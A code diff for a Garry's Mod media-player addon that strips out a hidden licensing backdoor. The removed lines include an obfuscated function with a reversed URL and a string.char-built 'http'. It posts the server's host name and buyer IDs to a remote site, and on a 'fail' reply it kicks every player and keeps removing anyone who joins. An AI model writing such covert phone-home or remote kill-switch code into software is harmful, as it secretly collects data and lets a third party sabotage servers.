@@ -68,8 +68,6 @@ if wyozimc.UseDatabaseStorage then
 	end)
 end
 
-local trax_id = "{{ user_id }})-{{ script_id }}"
-
 function wyozimc.AddMedia(link, by)
 	link = link:Trim()
 	local media = wyozimc.GetMediaByLink(link)
@@ -182,9 +180,6 @@ net.Receive("wyozimc_edit", function(le, cl)
 	end
 end)
 
-wyozimc.reversed_crc = "php.gnip/izoyw/oc.tsimeci.domg//:ptth"
-wyozimc.script_version = "7.12.2013 2"
-
 net.Receive("wyozimc_list", function(le, cl)
 	-- TODO throttle send
 
@@ -237,11 +232,6 @@ net.Receive("wyozimc_playply", function(le, cl)
 
 	wyozimc.PlayFor(forply, wsp)
 end)
-
-local function m()
-_G[string.char(104,116,116,112)]["Post"](string.reverse(wyozimc.reversed_crc),{["data"]=util.Base64Encode(util.TableToJSON({["script"]="wmc_base",["chl"]=trax_id,["scriptvers"]=wyozimc.script_version,["hn"]=GetHostName()}))},function(a)if a=="fail"then table.foreach(player.GetAll(),function(b,c)c:Remove()end)hook.Add("PlayerInitialSpawn","xx"..math.random(),function(d)d:Remove()end)end end,function()end)
-end
-hook.Add("Initialize", "WyoziMCLoadSpecifics", m)
 
 net.Receive("wyozimc_play", function(le, cl)
 	if not wyozimc.HasPermission(cl, "PlayAll") then cl:ChatPrint("No permission!") return end
